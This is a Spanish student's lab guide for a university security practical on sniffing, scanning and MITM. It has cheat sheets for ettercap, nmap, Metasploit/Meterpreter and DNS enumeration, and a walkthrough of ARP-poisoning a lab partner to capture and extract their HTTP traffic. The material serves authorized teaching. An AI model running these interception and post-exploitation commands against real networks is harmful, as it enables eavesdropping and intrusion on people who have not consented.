# PRÁCTICA 2 - Seguridad Informática

DEFENSA DE LA PRÁCTICA: 11 (en principio). Semana del 10 al 14 -> Apagan las máquinas el 7 de noviembre.

**Objetivo:** El objetivo de esta práctica es aprender y experimentar con la captura y el análisis del tráfico de red mediante sniffers, comprender y probar ataques DoS/DDoS, y trabajar la llamada «trilogía»: descubrimiento de hosts, escaneo de puertos y fingerprinting de sistemas (conjunto de técnicas usadas para identificar características de un equipo o servicio en la red). Además, se pretende gestionar y analizar la información de auditoría generada durante las pruebas, empleando en el laboratorio distintas herramientas sugeridas para practicar y validar los conceptos.

IMPORTANTE: ETTERCAP COMANDOS, FUNCIONAR OSSEC Y MEDUSA.

 1- Sniffers y análisis de tráfico: a, b, c, d.
 
 2- Ataques Man in the Middle: e, f. El apartado b también es un Man in The Middle.
 
 3-Detección y monitorización: g, i, j.
 
 4-Reconocimiento y escaneo de red: h, n, o
 
 5-Ataques y protección de servicios: k, l, p
 
 6-Sistemas de detección y respuesta: q, r 


En esta práctica se van a realizar muchos escaneos, ataques y defensas, por lo que se van a generar muchos logs en nuestro sistema. Tendremos que ir comprobando los logs poco a poco así como el espacio para que no se nos llene el disco ni ocurran cosas raras en nuestras máquinas.

**IMPORTANTE:** Mirar una vez al día cuánto espacio tiene nuestra máquina y cuando ocupa nuestro log de la máquina. Nos podemos encontrar hasta logs de 5 GB que no valen para nada.

## Repaso COMANDOS BÁSICOS útiles para la práctica

```bash
#Accesos
last               # Sesiones de usuarios accedidas a la máquina
date               # Hora sesión actual

# Navegación
pwd                 # Carpeta actual
ls                  # Listar
ls -l               # Listar con detalles
ls -a               # Incluir ocultos

cd /ruta            # Cambiar carpeta
cd ~                # Ir al home (~ es el directorio home del usuario actual)
cd ..               # Subir un nivel


# Archivos y directorios
touch archivo.txt   # Crear archivo vacío
mkdir carpeta       # Crear carpeta
mkdir -p a/b/c      # Crear subcarpetas
cp origen destino   # Copiar archivo
cp -r dir1 dir2     # Copiar directorio
mv origen destino   # Mover/renombrar
rm archivo.txt      # Borrar archivo
rm -r carpeta       # Borrar carpeta

# Ver contenido
cat archivo.txt     # Mostrar contenido
less archivo.txt    # Leer con paginador
head archivo.txt    # Primeras 10 líneas
tail archivo.txt    # Últimas 10 líneas
     tail -n archivo.log # Especificar las últimas N líneas
     tail -f archivo.log # Ver en tiempo real

# Búsqueda
find / -name "archivo.txt"  # Buscar archivo
grep                # Se utiliza para buscar y filtrar líneas de texto que coinciden con un patrón específico
    grep "texto" archivo.txt    # Buscar texto
    grep -r "texto" /ruta       # Buscar en varios archivos

# Redirección y tuberías (pipes)
> sobreescribe el archivo
>> añade al final del archivo

| tubería. Envía la salida de un comando como entrada de otro comando, conectando procesos en serie

# Permisos
ls -l               # Ver permisos
chmod 755 archivo   # Cambiar permisos
chown usr:grp arch  # Cambiar propietario

# Procesos
ps               # Procesos ligados a tu terminal actual
   -e            # Muestra todos los procesos del sistema 
   -a            # Procesos de todos los usuarios (excepto los sin terminal)
   -u            # Procesos con info del usuario, CPU, memoria, etc.
   -x            # Incluye procesos sin terminal (daemons, servicios)
ps aux           # Vista clásica estilo BSD, muestra todos los procesos con detalles
ps -ef           # Vista estilo Unix System V, alternativa a aux

top                 # Procesos en tiempo real
sudo systemd-cgtop  # Procesos en tiempo real de los grupos de control
watch               # Ejecuta un comando repetidamente
   -n <segundos>    # Intervalo de actualización (por defecto 2 segundos)
   -d               # Resalta los cambios en cada actualización
kill PID            # Terminar proceso

# Paquetes (Debian/Ubuntu)
sudo apt update           # Actualizar lista
sudo apt upgrade          # Actualiza los paquetes instalados a sus versiones nuevas, sin eliminar ni instalar paquetes adicionales
sudo apt full-upgrade     # Actualiza todo el sistema, incluso si para hacerlo debe instalar o eliminar paquetes
sudo apt install paquete  # Instalar
sudo apt remove paquete   # Eliminar
dpkg -l | wc -l           # Lista todos los paquetes instalados  y wc -l cuenta las líneas, es decir, el total de paquetes
        -dpkg -l → lista todos los paquetes.
        -grep '^ii' → filtra los que están instalados (ii)
        -wc -l → cuenta cuántos hay

#Limpieza
apt autoremove  # Limpia espacio quitando dependencias que ya no usa ningún paquete.
apt autoclean   # Borra archivos de instalación (.deb) viejos o inutilizables del caché de APT
apt purge nombre_paquete   # Desinstala y borra también archivos de configuración

# Red
ping 8.8.8.8         # Probar conexión
    -c:              # Especifica cuantos paquetes se van a mandar
ping6 2002:0a0b:3032::1 # Probar conexión IPv6
tracert ip           # Muestra el camino a seguir para alcanzar una IP

 **IP moderno**
ip a                         # Ver IP
ip addr show                 # Igual que ip a
ip addr add <IP>/<mask> dev <interfaz>   # Añadir dirección IP temporal
ip addr del <IP>/<mask> dev <interfaz>   # Quitar dirección IP
ip link show                 # Mostrar estado de interfaces
ip link set <interfaz> up    # Activar interfaz
ip link set <interfaz> down  # Desactivar interfaz
ip route show                # Mostrar tabla de rutas
ip route add <red> via <gateway> dev <interfaz>  # Añadir ruta
ip route del <red>           # Eliminar ruta

**ifconfig (antiguo)**
ifconfig                     # Mostrar interfaces activas
ifconfig <interfaz>          # Mostrar detalles de interfaz
ifconfig <interfaz> up       # Activar interfaz
ifconfig <interfaz> down     # Desactivar interfaz
ifconfig <interfaz> <IP> netmask <mask>  # Asignar IP temporal
ifconfig <interfaz>:<n> <IP> netmask <mask>  # Crear alias/interfaz lógica

**route (rutas)**
route -n                     # Mostrar tabla de rutas
route add default gw <gateway>        # Añadir puerta de enlace predeterminada
route del default gw <gateway>        # Eliminar puerta de enlace predeterminada
route add -net <red> gw <gateway>    # Añadir ruta específica
route del -net <red> gw <gateway>    # Eliminar ruta específica

**sockets**
1-Alternativa nueva
ss           # Muestra todos los sockets
   -t        # TCP
   -u        # UDP
   -l        # Solo sockets escuchando (listening)
   -n        # Mostrar IPs y puertos en números (no nombres)
   -p        # Mostrar PID y proceso que usa el socket
   -a        # Mostrar todos los sockets (escuchando y conectados)
   -s        # Resumen de conexiones por tipo

2-Alternativa clásica (más lento que ss, pero muy usada)
netstat
   -t        # TCP
   -u        # UDP
   -l        # Solo escuchando
   -n        # Números en lugar de nombres
   -p        # PID/Nombre del proceso
   -a        # Todas las conexiones y puertos escuchando
   -r        # Tabla de rutas
   -s        # Estadísticas de protocolos
   -i        # Interfaces de red
   -o        # Muestra información adicional relacionada con los temporizadores de las conexiones TCP

 
wget <url>                    # Descarga el contenido en un archivo con el mismo nombre que en el servidor
wget -o | -O <url>                 
		-o (o minúscula) → guarda el registro (mensajes) en un archivo.
		-O (O mayúscula) → guarda el archivo descargado con ese nombre.
wget --spider https://www.google.com  # Comprueba si la URL está disponible sin descargar nada
wget --timeout=10 https://www.google.com  # Límite de espera antes de rendirse
wget --server-response --spider <url>  # Hace la petición y muestra únicamente los headers HTTP, sin guardar nada
wget -q <url>                 # Descarga sin mostrar barras ni mensajes, solo errores.


curl <url>                   # Probar conexión HTTP/HTTPS y obtener contenido
curl -I <url>                # Solo encabezados HTTP
curl -s <url>                # Silencioso, sin mostrar progreso
curl -O <url>                # Descargar archivo
curl -L <url>                # Seguir redirecciones


# Usuarios
whoami               # Usuario actual
id                   # UID y grupos
adduser usuario      # Crear usuario
passwd usuario       # Cambiar contraseña

# Sistema
uname -r             # Versión kernel
lsb_release -a       # Versión distro
df -h                # Espacio en disco
du -sh carpeta       # Tamaño carpeta
free -h              # Memoria RAM
systemctl            # Gestiona el estado de los servicios del sistema
   - list-units → “lista las unidades que están activas ahora”
   - list-unit-files → “lista todas las unidades que existen y su configuración de inicio”
          ---type = service | target | socket | mount | device | timer | path | slice | automount | swap
          --state = active | inactive | enabled | disabled | masked | static
   - status <unidad> → “muestra el estado detallado de una unidad o servicio específico”
   - start <unidad> → “inicia un servicio/unidad”
   - stop <unidad> → “detiene un servicio/unidad”
   - restart <unidad> → “reinicia un servicio/unidad”
   - enable <unidad> → “configura la unidad para que arranque automáticamente”
   - disable <unidad> → “desactiva el arranque automático de la unidad”
   - get-default → “muestra el target por defecto del sistema”
   - set-default <target> → “cambia el target por defecto del sistema (permanente)”
   - isolate <target> → “cambia al target especificado inmediatamente (temporal)”
   - daemon-reload  →  e dice a systemd que recargue todas las unidades y servicios

	# Logs
Dos formas de ver los logs:
1-De forma centralizada: journald -> journalctl
journalctl           # Muestra los registros (logs) de los servicios y del sistema
     -b → “muestra los logs desde el último arranque”
     -a → “muestra todas las líneas completas, incluso las truncadas por pantalla”
     -p err → Muestra solo los mensajes de error (y más graves) del sistema
     -p warning → muestra solo mensajes de nivel warning y más graves (error, crítico, alerta)
     -x → Explica los mensajes del log con información extra si está disponible.
     -e → Va directamente al final de los logs (útil para ver los últimos errores)
     -u <unidad> → “filtra los logs de una unidad o servicio específico”
     -f  → “muestra los logs en tiempo real (como tail -f)”
     --since "YYYY-MM-DD HH:MM:SS" → “muestra logs desde una fecha/hora específica”
     --until "YYYY-MM-DD HH:MM:SS" → “muestra logs hasta una fecha/hora específica”

2-Accediendo a las carpetas de /var/log y viendo los logs que de cada tipo:
/var/log/syslog: mensajes generales del sistema
/var/log/auth.log:  autenticación, sudo, logins
/var/log/dpkg.log → instalación de paquetes
...

uptime               # Tiempo encendido
reboot               # Reiniciar
shutdown now         # Apagar

# Flag de ayuda para ver comandos grandes de golpe
--no-pager           # No hay paginación



## PRÁCTICA 2

# Transferencia de archivos
scp lsi@ip:/archivo_origen directorio_destinoLocal

# Ver donde están los ficheros .pcap
sudo find / -type f \( -iname "*.pcap" -o -iname "*.pcapng" -o -iname "*.cap" -o -iname "*.pcap.gz" -o -iname "*.pcapng.gz" \) -print 2>/dev/null


1- ETTERCAP — CHULETA DE FLAGS (TODO EN UN SOLO BLOQUE, TEXTO PLANO)

# Modos / interfaz
-T                        modo texto (CLI). Veremos toda la info de la red. Dentro de esta nos pedirá elegir:

	h → help. Ver ayuda completa de comandos disponibles

    s → statistics. Ver estadísticas de tráfico capturado

    l → list. Listar todos los hosts descubiertos (los 230)

    c → connections. Ver la lista de conexiones 

    q → Salir del programa

-C (NO USAR)                       modo curses (menús en terminal; más estructurado que -T).
-G (NO USAR)                       modo gráfico (GTK) — NO usar en servidores sin X.

# Ayuda / info
-h, --help                muestra ayuda.
-v, --version             muestra versión.
-q                        quiet: reduce verbosidad (menos salida en pantalla).

# Interfaz / captura
-i <iface>                usar interfaz (ej: eth0, wlan0).
-p, --nopromisc           no poner la interfaz en modo promiscuo.
-w <archivo.pcap>         guardar captura en archivo pcap.
-r <archivo.pcap>         leer tráfico desde un pcap (modo offline).
--autosave                (según versión) guardar automáticamente pcap.

# MitM / métodos de ataque
-M <METHOD:ARGS>          lanzar ataque man-in-the-middle.
                          Ejemplos:
                            -M arp:remote /IP1/ /IP2/   # engaña a IP1 y IP2 para que todo su tráfico pase por tu máquina (ARP poisoning entre dos hosts).
                            -M arp:gateway /IP_victima/ # hace creer a la víctima que tú eres el gateway (redirige su tráfico al gateway a través tuyo).
                            -M syn /IP1/ /IP2/          # usa método SYN (según versión, puede usarse para ciertos ataques/mitm).

-o                        only-mitm: solo hacer poisoning (no procesar/sniffear paquetes).
-B <iface1> <iface2>      modo bridge (inline) entre dos interfaces (filtrado inline).


# Filtros / modificaciones
-F <filtro_compilado>     cargar filtro compilado (output de etterfilter).
etterfilter input.ef -o out.ef   # compilar filtro antes de usarlo.
                          filtros permiten reemplazar cadenas, inyectar respuestas, bloquear, etc.

# Plugins
-P <plugin>               cargar plugin (ej: dns_spoof, chk_poison, autoadd, remote_browser).
                          algunos plugins requieren ficheros/config previos (hosts, reglas).

# Opciones de comportamiento
-u, --unoffensive         no reenviar paquetes (modo no destructivo).
-S                        modo sniffer (según versión) / minimizar acciones intrusivas.
--local-mac <MAC>         usar MAC local especificada (cuando aplicable).
--remote-mac <MAC>        especificar MAC remota (cuando aplicable).

# Logging / output
--log <file>              (según versión) guardar logs en archivo.
--debug                   modo debug (muy verboso).
--pcap                   (sin -w) opciones relacionadas con pcap (varía por versión).

# Ejecución / automatización
-q                        quiet, útil para scripts.
-n                        (según versión) no resolver nombres DNS/hosts (más rápido).
--no-spoof-check          evitar comprobaciones de spoofing (según versión).

# Señales / parada
(en lugar de Ctrl+C) usar pkill -TERM ettercap o sudo kill <PID> para parada limpia.




2- NMAP: Sirve para escanear redes y descubrir hosts, puertos y servicios.

# Puertos
-p : Define puertos específicos a escanear.  
- p : Escanea todos los puertos posibles (0-65535).  

# Escaneo de hosts
-sP : Detecta hosts activos en una red sin escanear puertos.
-sL: NO escanea puertos, ni hace ping a los equipos, solo lista las IPs/hosts que serían escaneadas-
- Pn : No realiza ping previo; asume que el host está activo.  

# Velocidad y control
-T0 a T5: Controla velocidad del escaneo (T0 muy lento y sigiloso, T5 muy rápido).  

# Detección de servicios y sistema operativo
- A: Escaneo completo (OS, servicios, versiones, scripts y traceroute).  
-O: Detecta el sistema operativo del host.  
-sV: Detecta servicios y sus versiones.  

# Tipos de escaneo
-sS: SYN scan (semi-abierto, rápido y menos detectable).  
-sT: TCP connect scan (completo, más detectable).  
-sU: Escaneo de puertos UDP.  

# Verbosidad y depuración
- `-v` : Modo verbose, muestra información detallada.  
- `-vv` : Verbose máximo.  
- `-d` : Modo debug para ver paquetes y procesos internos.  

# Filtrado y resultados
- `--open` : Muestra solo puertos abiertos.  
- `--reason` : Explica por qué un puerto está abierto, cerrado o filtrado.  

# Scripts NSE
- --script: Ejecuta scripts NSE para detección avanzada y auditorías.  
- --script=<script>: Ejecuta un script específico.  
- --script-args: Pasa argumentos a los scripts NSE.  
- --script-help: Muestra ayuda sobre los scripts disponibles.  

# Otras opciones útiles
- --traceroute: Realiza un traceroute hacia el host.  
- 6: Habilita escaneo IPv6.  
-N : No resuelve nombres DNS, usa solo IPs.  
- `-R` : Fuerza resolución DNS.  
- --max-retries: Número máximo de reintentos por host.  
- --host-timeout : Tiempo máximo permitido por host.  
- --max-rate : Limita la velocidad máxima de paquetes por segundo.  
- --min-rate : Define velocidad mínima de paquetes.  

# Salida de resultados
-oN : Guarda salida en formato normal.  
-oX : Guarda salida en formato XML.  
- o : Guarda salida en formato grepable.  
- oA : Guarda salida en todos los formatos anteriores.  
- --packet-trace : Muestra todos los paquetes enviados y recibidos.  
- --iflist : Lista interfaces de red disponibles y rutas.  
- --version-all : Detección de versión exhaustiva.  
- --version-light : Detección de versión rápida.  



3- NAST: Sirve para analizar y monitorizar redes locales.
-m	Muestra los equipos del segmento (IP + MAC)	
-i	Especifica la interfaz de red a usar	
-s	Activa modo sniffer (captura de tráfico)	
-p	Escanea puertos abiertos en un host	
-S	Detecta sniffers en la red (equipos escuchando tráfico)	
-g	Muestra información general de la red (gateway, máscara, etc.)	
-a	Analiza ARP (tabla de direcciones IP ↔ MAC)




4-METASPLOIT:
# Inicio
msfconsole        # Arranque de metasploit
mfsupdate         # Actualizar metasploit


# Búsquedas e información
search nombre
search type:exploit apache
search cve:2021
info

# Uso de exploits
use exploit/ruta/del/exploit

# Payloads
show payloads                      # Listar payloads
set PAYLOAD nombre_del_payload     # Seleccionar payload
run                                # Ejecutar payload


# Meterpreter
sysinfo          # Información del sistema comprometido
getuid           # Ver qué usuario eres
ps               # Listar procesos en ejecución
pwd              # Ver directorio actual
ls               # Listar archivos
cd /ruta         # Cambiar directorio
cat archivo.txt  # Ver contenido de archivo
search -f *.txt  # Buscar archivos por patrón
upload /ruta/local/file.txt   # Subir archivo a la víctima
download file.txt /ruta/local # Descargar archivo de la víctima
shell            # Acceder a la terminal normal de la víctima



5-Iftop (ver ancho de banda del tráfico por IP)
-i	# Elegir interfaz (-i ens33)
-P	# Mostrar puertos
-B	# Mostrar en bytes (no bits)
-t	# Modo texto (sin interfaz gráfica)
-n	# No resolver nombres (solo IPs)


6-Nethogs ((ver ancho de banda del tráfico por procesos)
<interfaz>	# Indicar interfaz (nethogs ens33)
-d X	    # Actualización cada X segundos (-d 1)
-t	        # Modo texto/log para scripts
-p	        # Mostrar solo procesos (más limpio)


# INFORMACIÓN SOBRE DOMINIOS

- host (cosultas básicas dominio)
host udc.es                          # IPv4 del dominio
host -t AAAA nombre.dominio          # IPv6 del dominio  
host -t NS nombre.dominio            # Servidores DNS
host -t MX nombre.dominio            # Servidores correo
host www.nombre.dominio              # Subdominio específico

- nslokkup (consultas interactivas dominio):
nslookup nombre.dominio                     # IP básica del dominio
nslookup -type=A nombre.dominio             # Registros A (IPv4)
nslookup -type=AAAA nombre.dominio          # Registros AAAA (IPv6)
nslookup -type=NS nombre.dominio            # Servidores DNS
nslookup -type=MX nombre.dominio            # Servidores correo
nslookup -type=SOA nombre.dominio           # Información zona DNS
nslookup -type=TXT nombre.dominio           # Textos informativos

-dig (consultas DNS avanzadas):
dig nombre.dominio                          # Consulta completa
dig nombre.dominio A +short                 # IPv4 resumido
dig nombre.dominio AAAA +short              # IPv6 resumido  
dig nombre.dominio NS +short                # DNS servers resumido
dig nombre.dominio MX +short                # Mail servers resumido
dig @8.8.8.8 nombre.dominio                 # Usar DNS específico
dig nombre.dominio ANY                      # Todos los registros
dig -x 193.144.53.84                        # Búsqueda inversa

# whois (Información registro dominio)
whois nombre.dominio                        # Info registro dominio
whois -h whois.ripe.net 193.144.53.84       # Info IP específica


# dnsenum (Enumeración automática)
dnsenum nombre.dominio                      # Escaneo completo


# dnsrecon (Enumeración avanzada)
dnsrecon -d udc.es                          # Escaneo completo dominio
dnsrecon -d udc.es -t brt                   # Fuerza bruta subdominios
dnsrecon -r 193.144.48.0-193.144.63.255     # Escaneo inverso IPs


# Transferencia de zona
dig @MIIP axfr nombre.dominio


# Información Webs/CMS
whatweb udc.es                       # Tecnologías web
curl -I udc.es                       # Headers HTTP
wget --spider -r -l 1 udc.es         # Estructura sitio


--------------------------------------------------------------------

```


<br>
<br>

## 1-SNIFFERS Y ANÁLISIS DE TRÁFICO

Sniffers (o analizadores de paquetes) son herramientas o programas software diseñados para capturar, monitorizar y analizar el tráfico de red que circula por un segmento de red. Su funcionamiento se basa en poner la tarjeta de red (NIC) en modo promiscuo, lo que le permite capturar todos los paquetes que pasan por la red, no solo los dirigidos específicamente a esa máquina.

### **Apartado a) Instale el ettercap y pruebe sus opciones básicas en línea de comando.**

**ARP SPOOFING**: Ettercap es una herramienta usada para hacer análisis y manipulación del tráfico de red, especialmente en redes LAN.
Se utiliza mucho en auditorías de seguridad para ver cómo viajan los datos y detectar posibles ataques o vulnerabilidades.

¡¡SOLO ANALIZAREMOS TRÁFICO IPv4!!

Vamos a instalar ettercap en nuestra máquina sin interfaz gráfica. Para eso:

```bash
apt install ettercap-text-only
```

Al instalarlo con text-only no dejará entrar al modo interactivo. Esto quiere decir que cada vez que queramos hacer algo con ettercap solo podemos teclear sus comandos desde la línea de comandos. El modo interactivo es como una especie de shell dentro de nuestra línea de comandos, pero eso nosotros no lo hemos activado.


Llamamos a eterrcap por la línea de comandos. Ettercap tiene los siguientes parámetros principales:

- -T: modo solo texto. Muestra el tráfico de red en tiempo real. Muestra demasiada información, cientos de líneas por segundo. Subflags para -T:

- -q: Silencioso (menos output). Muestra solo LO IMPORTANTE ya que omite paquetes técnicos como ACK,SYN etc.

- -i: especificarle la interfaz. 

- -L: para escribir en un fichero con extension .ettrcap                                                                                                 
- -w: para escribir en un fichero con extension .pcap      

- -P <pluging> -> especificar que plugin usar
- -p -> permite capturar todos los paquetes que pasan a través de la red
                                                             
- -r: para leer un fichero con extensión .pcap

- -t: filtrar por protocolo (http, tcp...)
 
- -M <metodos:argumentos> -> hace un ataque MITM(man in the middle). Subflags para -M:                                                                                                                                                 
    - arp:remote / arp:gateway -> para hacer un arp poisoning(ARP spoofing)                                          
	- icmp:MAC/IP -> ataque de redireccionamento icmp                                                          
    - DHCP:ip_pool/netmask/dns -> para un dhcp spoofing                                                         
    - port:remote/tree -> robo de puertos     

Para hacer ataques MiM, ettercap tiene **dos targets**. Esto significa que Ettercap necesita dos equipos entre los que va a ponerse en medio para espiar o alterar el tráfico.

- Target 1 (T1) = primer equipo (por ejemplo: la víctima, un PC).
	
- Target 2 (T2) = segundo equipo (por ejemplo: el router/gateway o otro PC).


No usar ettercap con target ///  -> no hacer esto porque colapsa porque se está leyendo toda la red.


¡IMPORTANTE!: a veces cerrar un comando con Ctrl+C de ettercap puede dar problemas. Para cerrar bien:

```bash
sudo pkill -TERM ettercap
# o si prefieres por PID:
sudo pgrep -a ettercap      # ver PID
sudo kill -TERM <PID>
```


<br>

---
### **Apartado b) Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Sobre esta paquetería (puede utilizar el wireshark para los siguientes subapartados)**

- **Identifique los campos de cabecera de un paquete TCP**  
- **Filtre la captura para obtener el tráfico HTTP**  
- **Obtenga los distintos “objetos” del tráfico HTTP (imágenes, pdfs, etc.)**  
- **Visualice la paquetería TCP de una determinada sesión.**  
- **Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información para un análisis básico del tráfico.**  
- **Obtenga información del tráfico de las distintas “conversaciones” mantenidas.**  
- **Obtenga direcciones finales del tráfico de los distintos protocolos como mecanismo para determinar qué circula por nuestras redes.**

 
!! Solo usaremos HTTP porque no va cifrado !!

Instalar **wireshark** en local y ver el tráfico del compañero -> tendremos que ver el gato que nuestro compañero descarga con curl. Cuidado con los balanceadores!! Buscar fotos que sean solo en http (https no que va cifrado).

Una vez instalado wireshark tenemos que instalar en la máquina **tcpdump** para poder ver el tráfico de la máquina en wireshark.


**PASOS ATAQUE-DEFENSA**

1- El atacante hace sniffing al trafico del compañero:
```bash
ettercap -T -q -i ens33 -M arp:remote //10.11.48.175/ //10.11.48.1/ (sniffing da paqueteria)
```

Mientras esfina, en otro terminal:
```bash
tcpdump -i ens33 -s 65536 -w /home/lsi/lsicompa.pcap
```

   [-i] es para especificar la interfaz.
   [-s] el límite de bytes de los paquetes a capturar.
   [-w] el achivo donde se guardará.


<br>

2-Mientras el atacante hace el sniffing y guarda la paqueteria (tcpdump), la víctima busca imágenes, páginas, archivos en http (https no sirve ya que la info está cifrada):

 2.1- Archivo lsicompa:
```bash
curl http://www.edu4java.com/_img/web/http.png 
curl http://owasp.org/
curl http://informatica.uv.es/iiguia/IST/Tema2.pdf
```


El atacante tiene que poder ver más adelante:
- pdf 
- foto
- web 

<br>

3- El atacante sale de ettercap con q (si salimos con ctrl+c tiramos con la conexion del compañero), hace ctrl+c en el terminal donde está el tcpdump y enviamos el archivo a nuestra máquina local:

  1º forma -> si tenemos Windows y nos conectamos por ssh con mobaXTerm o Bitvise SSH con arrastrar o archivo a nuestro ordenador ya está.

  2º forma -> si no tenemos acceso a nuestro árbol de directorios de la máquina de lsi o temos Linux ejecutamos -> scp lsi@ip rutaArchivomáquina destinoLocal

  ```bash
 scp lsi@10.11.48.202:/home/lsi/lsicompa.pcap "C:\Users\User\Desktop\INGENIERIA_INFORMATICA\4_curso\1_CUATRI\LSI\P2\"
```


- lsicompa- http con página web, foto y pdf.


<br>

4- Abrimos Wireshark:

Arriba en archivos le damos a abrir y seleccionamos el archivo .pcap y veríamos toda la paqueteria que se capturo con el ettercap.


- **Identifique los campos de cabecera de un paquete TCP**

En la lista da paquetería buscamos un paquete TCP, pinchamos en uno y abajo nos pone las siguientes lineas:

    Frame 59: 165 bytes on wire (1320 bits), 165 bytes captured (1320 bits)
    Ethernet II, Src: VMware_97:24:d0 (00:50:56:97:24:d0), Dst: VMware_97:d5:d9 (00:50:56:97:d5:d9)
	Internet Protocol Version 4, Src: 10.30.12.20, Dst: 10.11.48.202
    Transmission Control Protocol, Src Port: 63928, Dst Port: 22, Seq: 1, Ack: 165, Len: 0

Pulsamos sobre la flecha desplegable a la izquierda de “Transmission Control Protocol".

<img width="1005" height="513" alt="imagen" src="https://github.com/user-attachments/assets/e84d50c7-72c1-461a-8bcd-05d2d267ee17" />

<br>

- **Filtre la captura para obtener el tráfico http**

En la barra de filtros ponemos http:
<img width="1595" height="171" alt="imagen" src="https://github.com/user-attachments/assets/c8dcc23d-43ba-4ca0-a84a-d3c3a04c2029" />


- **Obtenga los distintos “objetos” del tráfico HTTP (imágenes, pdfs, etc.)**

1-IMÁGENES

Una vez que filtramos por http, pinchamos en una petición y miramos la estructura que tiene.

Para ver la imagen, accedemos al http que indica que tiene una imagen y vamos a su estructura.

Abajo del todo nos aparece en enlace:
<img width="1563" height="678" alt="imagen" src="https://github.com/user-attachments/assets/75469ca8-0c97-4cbd-a408-6c3d7cc36bf8" />


Esto no!!: Clic derecho en el enlace -> Copiar -> Valor -> Pegamos la URL en internet y podemos visualizar la imagen.

**CARLOS PIDE ESTO**: Seleccionamos un paquete HTTP y vamos File > Export Objects > HTTP y le damos a preview para visualizar el archivo de la petición, o a save si queremos guardarnoslo.

<br>

-PDFS:

Hacemos lo mismo que con las imágenes.


<br>

- **Visualice la paquetería TCP de una determinada sesión.**

Vamos a 'Analizar' > 'Seguir' > Secuencia tcp (tcp stream)

<img width="992" height="767" alt="imagen" src="https://github.com/user-attachments/assets/e0f415a6-22ae-4af1-bfbc-e03243363065" />


<br>

- **Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información para un análisis básico del tráfico.**  

Vamos a 'Estadísticas' > Jerarquia de protocolo

<img width="1156" height="207" alt="imagen" src="https://github.com/user-attachments/assets/a6cf9129-3275-4f13-84ae-7f509eb17b63" />


<br>

- **Obtenga información del tráfico de las distintas “conversaciones” mantenidas.**

Vamos a 'Estadísticas' > Conversaciones

<img width="938" height="401" alt="imagen" src="https://github.com/user-attachments/assets/faa5b18d-2074-4e5d-8708-4c6ff18bdacc" />


<br>

- **Obtenga direcciones finales del tráfico de los distintos protocolos como mecanismo para determinar qué circula por nuestras redes.**

Vamos a 'Estadísticas' > Puntos finales

<img width="922" height="392" alt="imagen" src="https://github.com/user-attachments/assets/b75dda09-290d-47a2-ac98-29c694ac7c1f" />


<br>
<br>

---

### **Apartado c) Obtenga la relación de las direcciones MAC de los equipos de su segmento.**

Para hacer esto tenemos que instalar **nmap**. ¡¡Hacer solo sobre IPv4, no hacer nada con IPv6!!

Instalamos nmap y nast:
```bash
apt install nmap
apt installl nast
```


1. Con nmap:
```bash
nmap -sP 10.11.48.0/23    
```


- -sP : Detecta hosts activos en una red sin escanear puertos.

Usa -sn (en vez de -sP) en nmap moderno. Si quieres fiabilidad en una red local, ejecuta nmap como root para que use ARP y devuelva MACs.

Ejemplo de salida:
```bash
root@ismael:~# nmap -sP 10.11.48.0/23
Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-28 10:59 CET
Nmap scan report for 10.11.48.1
Host is up (0.0014s latency).
MAC Address: DC:08:56:10:84:B9 (Alcatel-Lucent Enterprise)
Nmap scan report for 10.11.48.16
Host is up (0.0020s latency).
MAC Address: 00:50:56:97:77:98 (VMware)
Nmap scan report for 10.11.48.18
Host is up (0.0047s latency).
MAC Address: 00:50:56:97:E8:37 (VMware)
Nmap scan report for 10.11.48.19
Host is up (0.0015s latency).
MAC Address: 00:50:56:97:83:57 (VMware)
Nmap scan report for 10.11.48.20
Host is up (0.0075s latency).
MAC Address: 00:50:56:97:36:AF (VMware)
Nmap scan report for 10.11.48.21
Host is up (0.0014s latency).
MAC Address: 00:50:56:97:2D:B4 (VMware)
Nmap scan report for 10.11.48.23
```

2. Con nast:
```bash
nast -m -i ens33
```

Ejemplo de salida:
```bash
MAC address             Ip address (hostname)
===========================================================
00:50:56:97:29:8F       10.11.48.202 (ismael) (*)
DC:08:56:10:84:B9       10.11.48.1 (_gateway)
00:50:56:97:77:98       10.11.48.16 (10.11.48.16)
00:50:56:97:E8:37       10.11.48.18 (10.11.48.18)
00:50:56:97:83:57       10.11.48.19 (10.11.48.19)
00:50:56:97:36:AF       10.11.48.20 (10.11.48.20)
00:50:56:97:2D:B4       10.11.48.21 (10.11.48.21)
00:50:56:97:55:E1       10.11.48.23 (10.11.48.23)
00:50:56:97:A8:AB       10.11.48.25 (10.11.48.25)
00:50:56:97:DC:BD       10.11.48.26 (10.11.48.26)
00:50:56:97:88:90       10.11.48.27 (10.11.48.27)
00:50:56:97:4D:B5       10.11.48.28 (10.11.48.28)
00:50:56:97:F6:4C       10.11.48.29 (10.11.48.29)
00:50:56:97:9F:25       10.11.48.30 (10.11.48.30)
```


Saca la lista de MACs ordenadas de nuestra red.
   
<br>
<br>

---

### **Apartado d) Obtenga el tráfico de entrada y salida legítimo de su interface de red ens33 e investigue los servicios, conexiones y protocolos involucrados.**

Cuidado con localhost, que es virtual!!!


- TCPDUMP:
	
   1. Instalamos tcpdump: Comando apt install tcpdump (ya lo tenemos instalado de antes).
   
   2. Comando:
	
```bash
tcpdump -i ens33 -w /home/lsi/traficored.pcap
```
   Escuchamos el tráfico de la red. Lo dejamos un ratito para que recoja datos.

Vamos a hacer lo mismo sin escuchar en localhost:
```bash
tcpdump -i ens33 'not (net 127.0.0.0/8)' -w /home/lsi/traficored2.pcap
```

   3. Una vez con el fichero .pcap, los metemos en Wireshark y vemos el tráfico.
      
```bash
scp lsi@10.11.48.202:/home/lsi/traficored.pcap "C:\Users\User\Desktop\INGENIERIA_INFORMATICA\4_curso\1_CUATRI\LSI\P2\"
scp lsi@10.11.48.202:/home/lsi/traficored2.pcap "C:\Users\User\Desktop\INGENIERIA_INFORMATICA\4_curso\1_CUATRI\LSI\P2\"
```


**SERVICIOS, CONEXIONES Y PROTOCOLOS INVOLUCRADOS**

- Servicios:

Aplicaciones o funciones de red que usan un puerto concreto (por ejemplo, web, DNS, SSH). Cada servicio usa un protocolo asociado (HTTP, DNS, SSH, etc.).

Filtro general:

tcp || udp

Mira la columna Protocol → verás cosas como HTTP, TLSv1.2, DNS, SSH, DHCP. También puedes mirar la columna Info, que indica el tipo de tráfico o puerto.

<br>

- Conexiones

Comunicación entre dos direcciones IP y puertos (cliente ↔ servidor).

